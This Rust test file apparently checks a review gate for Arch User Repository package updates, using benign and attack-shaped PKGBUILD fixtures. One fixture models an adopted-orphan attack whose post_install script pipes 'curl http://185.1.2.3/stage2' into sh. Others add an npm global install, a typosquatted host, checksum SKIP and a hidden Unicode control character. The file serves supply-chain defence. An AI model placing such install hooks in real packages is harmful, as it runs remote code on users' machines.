//! Golden cases modelled on the 2026 AUR campaigns and on benign updates of
//! each provenance class. Every case asserts the class and floor risk; the
//! reasons and findings named are the ones an operator must see.

use repoman_alpm::srcinfo::Srcinfo;

use super::*;

struct Case {
    old_srcinfo: String,
    new_srcinfo: String,
    old_pkgbuild: String,
    new_pkgbuild: String,
    old_scripts: Vec<(String, String)>,
    new_scripts: Vec<(String, String)>,
    old_files: Vec<String>,
    new_files: Vec<String>,
    maintainer_changed: bool,
    adopted_from_orphan: bool,
    history_rewritten: bool,
    srcinfo_mismatch: Option<bool>,
    official: Vec<&'static str>,
}

fn srcinfo(pkgbase: &str, pkgver: &str, extra_base: &str, sources: &[&str], sums: &[&str]) -> String {
    let src: String = sources.iter().map(|s| format!("\tsource = {s}\n")).collect();
    let sums: String = sums.iter().map(|s| format!("\tsha256sums = {s}\n")).collect();
    format!(
        "pkgbase = {pkgbase}\n\tpkgdesc = A thing\n\tpkgver = {pkgver}\n\tpkgrel = 1\n\turl = https://github.com/owner/{pkgbase}\n\tarch = x86_64\n\tlicense = MIT\n\tdepends = glibc\n{extra_base}{src}{sums}\npkgname = {pkgbase}\n"
    )
}

fn pkgbuild(pkgver: &str, prepare: &str, package: &str) -> String {
    format!(
        "pkgname=foo\npkgver={pkgver}\npkgrel=1\narch=(x86_64)\nsource=(\"https://github.com/owner/foo/archive/v$pkgver.tar.gz\")\nsha256sums=('x')\n\nprepare() {{\n{prepare}}}\n\npackage() {{\n{package}}}\n"
    )
}

const PREPARE_OK: &str = "  cd \"foo-$pkgver\"\n";
const PACKAGE_OK: &str = "  install -Dm755 foo \"$pkgdir/usr/bin/foo\"\n";

impl Case {
    fn bump(from: &str, to: &str) -> Case {
        Case {
            old_srcinfo: srcinfo("foo", from, "", &[&format!("https://github.com/owner/foo/archive/v{from}.tar.gz")], &["aaaa"]),
            new_srcinfo: srcinfo("foo", to, "", &[&format!("https://github.com/owner/foo/archive/v{to}.tar.gz")], &["bbbb"]),
            old_pkgbuild: pkgbuild(from, PREPARE_OK, PACKAGE_OK),
            new_pkgbuild: pkgbuild(to, PREPARE_OK, PACKAGE_OK),
            old_scripts: vec![],
            new_scripts: vec![],
            old_files: vec![".SRCINFO".into(), "PKGBUILD".into()],
            new_files: vec![".SRCINFO".into(), "PKGBUILD".into()],
            maintainer_changed: false,
            adopted_from_orphan: false,
            history_rewritten: false,
            srcinfo_mismatch: None,
            official: vec!["glibc", "python", "jq", "git"],
        }
    }

    fn run(&self) -> Verdict {
        let old = Srcinfo::parse(&self.old_srcinfo).unwrap();
        let new = Srcinfo::parse(&self.new_srcinfo).unwrap();
        let official = self.official.clone();
        let is_official = move |n: &str| official.contains(&n);
        evaluate(&GateInput {
            old: &old,
            new: &new,
            old_pkgbuild: Some(&self.old_pkgbuild),
            new_pkgbuild: &self.new_pkgbuild,
            new_scripts: &self.new_scripts,
            old_scripts: &self.old_scripts,
            old_files: &self.old_files,
            new_files: &self.new_files,
            maintainer_changed: self.maintainer_changed,
            adopted_from_orphan: self.adopted_from_orphan,
            history_rewritten: self.history_rewritten,
            srcinfo_mismatch: self.srcinfo_mismatch,
            is_official: &is_official,
        })
    }
}

fn kinds(v: &Verdict) -> Vec<&str> {
    v.reasons.iter().map(|r| r.kind.as_str()).collect()
}

fn rules(v: &Verdict) -> Vec<&str> {
    v.findings.iter().filter(|f| f.severity > Risk::Low).map(|f| f.rule.as_str()).collect()
}

#[test]
fn benign_upstream_source_bump_is_routine() {
    let v = Case::bump("1.0.0", "1.1.0").run();
    assert_eq!(v.diff_class, DiffClass::Routine, "{v:?}");
    assert_eq!(v.floor_risk, Risk::Low);
    assert!(kinds(&v).contains(&"version_bump"));
    assert!(kinds(&v).contains(&"source_version_substitution"));
    assert!(v.findings.is_empty());
}

#[test]
fn benign_binary_bump_with_arch_sources_is_routine() {
    let mut c = Case::bump("2.3", "2.4");
    c.old_srcinfo = srcinfo("foo-bin", "2.3", "\tsource_x86_64 = https://dl.example.com/foo/2.3/foo-2.3-x86_64.AppImage\n\tsha256sums_x86_64 = aa\n", &["foo.desktop"], &["cc"]);
    c.new_srcinfo = srcinfo("foo-bin", "2.4", "\tsource_x86_64 = https://dl.example.com/foo/2.4/foo-2.4-x86_64.AppImage\n\tsha256sums_x86_64 = bb\n", &["foo.desktop"], &["cc"]);
    let v = c.run();
    assert_eq!(v.diff_class, DiffClass::Routine, "{v:?}");
    assert_eq!(v.floor_risk, Risk::Low);
}

#[test]
fn pkgrel_bump_with_metadata_is_metadata() {
    let mut c = Case::bump("1.0.0", "1.0.0");
    c.new_srcinfo = c
        .new_srcinfo
        .replace("pkgrel = 1", "pkgrel = 2")
        .replace("pkgdesc = A thing", "pkgdesc = A better thing\n\toptdepends = jq: json output")
        .replace("depends = glibc", "depends = glibc\n\tdepends = python");
    let v = c.run();
    assert_eq!(v.diff_class, DiffClass::Metadata, "{v:?}");
    assert_eq!(v.floor_risk, Risk::Low);
    assert!(kinds(&v).contains(&"dependency_change"));
}

#[test]
fn new_aur_dependency_is_structural() {
    let mut c = Case::bump("1.0.0", "1.0.1");
    c.new_srcinfo = c.new_srcinfo.replace("depends = glibc", "depends = glibc\n\tdepends = libfoo-git");
    let v = c.run();
    assert_eq!(v.diff_class, DiffClass::Structural);
    assert_eq!(v.floor_risk, Risk::Medium);
    assert!(kinds(&v).contains(&"new_aur_dependency"), "{v:?}");
}

#[test]
fn adopted_orphan_with_install_script_payload() {
    // The 2026 shape: a new maintainer adopts an orphan, bumps pkgrel, and
    // adds an install script that fetches and runs a second stage.
    let mut c = Case::bump("1.0.0", "1.0.0");
    c.maintainer_changed = true;
    c.new_srcinfo = c.new_srcinfo.replace("pkgrel = 1", "pkgrel = 2\n\tinstall = foo.install");
    c.new_pkgbuild = c.new_pkgbuild.replace("pkgrel=1", "pkgrel=2\ninstall=foo.install");
    c.new_files.push("foo.install".into());
    c.new_scripts.push((
        "foo.install".into(),
        "post_install() {\n  curl -s http://185.1.2.3/stage2 | sh\n}\n".into(),
    ));
    let v = c.run();
    assert_eq!(v.diff_class, DiffClass::Structural);
    assert_eq!(v.floor_risk, Risk::High);
    for k in ["maintainer_changed", "install_script_reference", "install_script_added", "new_file"] {
        assert!(kinds(&v).contains(&k), "missing {k} in {:?}", kinds(&v));
    }
    for r in ["network_tool", "ip_literal_url", "pipe_to_shell"] {
        assert!(rules(&v).contains(&r), "missing {r} in {:?}", rules(&v));
    }
}

#[test]
fn npm_payload_in_package_function() {
    let mut c = Case::bump("1.0.0", "1.0.1");
    c.new_pkgbuild = pkgbuild(
        "1.0.1",
        PREPARE_OK,
        "  npm install --global totally-fine-helper\n  install -Dm755 foo \"$pkgdir/usr/bin/foo\"\n",
    );
    let v = c.run();
    assert_eq!(v.diff_class, DiffClass::Structural);
    assert_eq!(v.floor_risk, Risk::High);
    assert!(kinds(&v).contains(&"function_changed"));
    assert_eq!(rules(&v), ["package_manager_fetch"]);
    assert_eq!(v.findings[0].function.as_deref(), Some("package"));
}

#[test]
fn cargo_fetch_added_to_prepare_is_only_medium() {
    // Arch's own guidance; a reviewer should see it, not be alarmed by it.
    let mut c = Case::bump("1.0.0", "1.0.1");
    c.new_pkgbuild = pkgbuild("1.0.1", "  cd \"foo-$pkgver\"\n  cargo fetch --locked\n", PACKAGE_OK);
    let v = c.run();
    assert_eq!(v.diff_class, DiffClass::Structural);
    assert_eq!(v.floor_risk, Risk::Medium);
}

#[test]
fn typosquat_source_host_is_high() {
    let mut c = Case::bump("1.0.0", "1.0.1");
    c.new_srcinfo = c.new_srcinfo.replace("https://github.com/owner/foo/archive", "https://github.com/0wner/foo/archive");
    let v = c.run();
    assert_eq!(v.diff_class, DiffClass::Structural);
    assert_eq!(v.floor_risk, Risk::High);
    assert!(kinds(&v).contains(&"source_host_changed"), "{v:?}");
}

#[test]
fn version_going_backwards_is_high() {
    let v = Case::bump("1.2.0", "1.1.9").run();
    assert_eq!(v.floor_risk, Risk::High);
    assert!(kinds(&v).contains(&"version_backwards"));
}

#[test]
fn checksum_skip_introduced_is_structural() {
    let mut c = Case::bump("1.0.0", "1.0.1");
    c.new_srcinfo = c.new_srcinfo.replace("sha256sums = bbbb", "sha256sums = SKIP");
    let v = c.run();
    assert_eq!(v.diff_class, DiffClass::Structural);
    assert_eq!(v.floor_risk, Risk::Medium);
    assert!(kinds(&v).contains(&"checksum_skip"));
}

#[test]
fn findings_present_at_baseline_do_not_raise_risk() {
    let mut c = Case::bump("1.0.0", "1.0.1");
    for pb in [&mut c.old_pkgbuild, &mut c.new_pkgbuild] {
        *pb = pb.replace("pkgrel=1", "pkgrel=1\nurl=\"http://foo.example.org\"");
    }
    let v = c.run();
    assert_eq!(v.diff_class, DiffClass::Routine);
    assert_eq!(v.floor_risk, Risk::Low, "{v:?}");
    assert_eq!(v.findings.len(), 1);
    assert_eq!(v.findings[0].note.as_deref(), Some("present at baseline"));
}

#[test]
fn unchanged_install_script_is_not_re_raised() {
    let mut c = Case::bump("1.0.0", "1.0.1");
    let script = ("foo.install".to_string(), "post_install() {\n  systemctl daemon-reload\n}\n".to_string());
    c.old_scripts.push(script.clone());
    c.new_scripts.push(script);
    for f in [&mut c.old_files, &mut c.new_files] {
        f.push("foo.install".into());
    }
    for s in [&mut c.old_srcinfo, &mut c.new_srcinfo] {
        *s = s.replace("pkgrel = 1", "pkgrel = 1\n\tinstall = foo.install");
    }
    let v = c.run();
    assert_eq!(v.diff_class, DiffClass::Routine, "{v:?}");
    assert_eq!(v.floor_risk, Risk::Low);
}

#[test]
fn srcinfo_mismatch_is_high() {
    let mut c = Case::bump("1.0.0", "1.0.1");
    c.srcinfo_mismatch = Some(true);
    let v = c.run();
    assert_eq!(v.floor_risk, Risk::High);
    assert!(kinds(&v).contains(&"srcinfo_mismatch"));
}

#[test]
fn hidden_unicode_in_pkgbuild_is_high() {
    let mut c = Case::bump("1.0.0", "1.0.1");
    c.new_pkgbuild = c.new_pkgbuild.replace("  cd \"foo-$pkgver\"\n", "  cd \"foo-$pkgver\" \u{202E}\n");
    let v = c.run();
    assert_eq!(v.floor_risk, Risk::High);
    assert!(rules(&v).contains(&"unicode_control"));
}

#[test]
fn onboarding_without_baseline_lints_the_head_only() {
    // No old PKGBUILD: every finding counts, nothing is suppressed.
    let new = Srcinfo::parse(&srcinfo("foo", "1.0", "", &["https://github.com/owner/foo/archive/v1.0.tar.gz"], &["aa"])).unwrap();
    let pb = pkgbuild("1.0", PREPARE_OK, "  curl https://x/y -o \"$pkgdir/usr/bin/foo\"\n");
    let v = evaluate(&GateInput {
        old: &new,
        new: &new,
        old_pkgbuild: None,
        new_pkgbuild: &pb,
        new_scripts: &[],
        old_scripts: &[],
        old_files: &[],
        new_files: &[],
        maintainer_changed: false,
        adopted_from_orphan: false,
        history_rewritten: false,
        srcinfo_mismatch: None,
        is_official: &|_| true,
    });
    assert_eq!(v.diff_class, DiffClass::Routine);
    assert_eq!(v.floor_risk, Risk::High);
    assert_eq!(rules(&v), ["network_tool"]);
}

#[test]
fn adoption_and_rewritten_history_are_structural_high() {
    let mut c = Case::bump("1.0", "1.1");
    c.adopted_from_orphan = true;
    let v = c.run();
    assert_eq!(v.diff_class, DiffClass::Structural);
    assert_eq!(v.floor_risk, Risk::High);
    assert!(v.reasons.iter().any(|r| r.kind == "adopted_from_orphan"), "{:?}", v.reasons);

    let mut c = Case::bump("1.0", "1.1");
    c.history_rewritten = true;
    let v = c.run();
    assert_eq!(v.diff_class, DiffClass::Structural);
    assert_eq!(v.floor_risk, Risk::High);
    assert!(v.reasons.iter().any(|r| r.kind == "history_rewritten"), "{:?}", v.reasons);
}
